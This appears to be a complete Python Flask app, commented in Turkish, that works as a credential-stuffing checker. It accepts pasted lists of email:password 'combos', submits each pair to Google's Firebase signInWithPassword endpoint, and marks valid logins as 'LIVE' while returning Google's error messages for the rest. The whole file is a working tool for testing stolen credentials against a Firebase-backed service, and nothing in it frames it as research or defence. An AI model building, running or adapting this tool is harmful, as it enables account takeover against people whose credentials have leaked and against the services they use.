import os
import requests
from flask import Flask, render_template, request, jsonify

app = Flask(__name__)

# Anahtarı Vercel'den çekiyoruz
API_KEY = os.getenv("FIREBASE_API_KEY")

def check_account(email, password):
    # Anahtar gelmiş mi kontrol et
    if not API_KEY:
        return "ANAHTAR_YOK"

    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
    payload = {"email": email, "password": password, "returnSecureToken": True}
    
    try:
        r = requests.post(url, json=payload, timeout=10)
        data = r.json()
        
        if r.status_code == 200:
            return "LIVE"
        
        # Google'ın verdiği gerçek hata mesajını döndür
        error_msg = data.get('error', {}).get('message', 'BAD')
        return error_msg 
    except Exception:
        return "SISTEM_HATASI"

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/start_scan', methods=['POST'])
def start_scan():
    data = request.json
    combos = data.get('combos', '').splitlines()
    results = []
    
    for line in combos:
        if ":" in line:
            email, password = line.split(":", 1)
            status = check_account(email.strip(), password.strip())
            results.append({"account": line, "status": status})
    
    return jsonify({"results": results})

if __name__ == '__main__':
    app.run(debug=True)
